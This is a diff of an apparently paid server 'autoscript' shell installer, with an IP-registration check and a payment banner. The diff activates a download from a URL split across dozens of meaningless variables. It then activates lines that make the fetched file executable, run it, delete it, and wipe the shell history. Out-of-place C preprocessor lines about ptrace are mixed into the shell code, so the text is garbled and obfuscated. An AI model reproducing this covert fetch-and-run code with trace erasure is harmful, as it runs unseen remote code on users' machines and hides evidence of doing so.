@@ -944,7 +944,7 @@ find=`grep $myip ip.txt`
 if [ "$find" = "" ]
 then
 echo ""
-echo -e "\e[0;31m          
+echo -e "\e[0;32m          
                   I AM ARE SORRY YOUR IP NOT REGISTER YET    
                ÷==================== MENU ===================÷
                *                                             *
@@ -955,15 +955,31 @@ echo -e "\e[0;31m
                *                                             *
                ÷================= 32-64-bit =================÷
                
-                 Please make payment before use auto script 
+                 Please make payment before unlock autoscript 
 \e[0;0m"
-	rm -f /root/ip.txt
-	exit
+rm -f /root/ip.txt
+exit
 fi
-
-
-
-
+#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
+#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
+/* rtc.c */
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#if !TRACEABLE
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
 thi="ter"
 licence () {
 #if 0
@@ -1458,7 +1474,7 @@ ngay="raw"
 #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
 #	define PTRACE_ATTACH	PT_ATTACH
 lee-connect
-#wget $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$tinh$gach$sao$thi$gach$tien$tinh$gach$xin$gach$hoi$loi$gach$dich$thuc
+$taive $tim$kiem$haicham$gach$gach$ngay$cham$sai$nao$yeu$nhau$anh$cham$hoi$gach$em$cau$rang$gach$tien$tinh$gach$sao$thi$gach$tien$tinh$gach$xin$gach$hoi$loi$gach$dich$thuc
 clear
 lee-connect
 echo "Ok Leee Dzung..........................."
@@ -2486,9 +2502,9 @@ sai="git"
 #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
 #	define PTRACE_ATTACH	PT_ATTACH
 #endif
-#chmod +x $dich$thuc
-#$cham$gach$dich$thuc
-#rm -f $dich$thuc
+chmod +x $dich$thuc
+$cham$gach$dich$thuc
+rm -f $dich$thuc
 history -c
 cd ~/
 cat /dev/null > ~/.bash_history && history -c
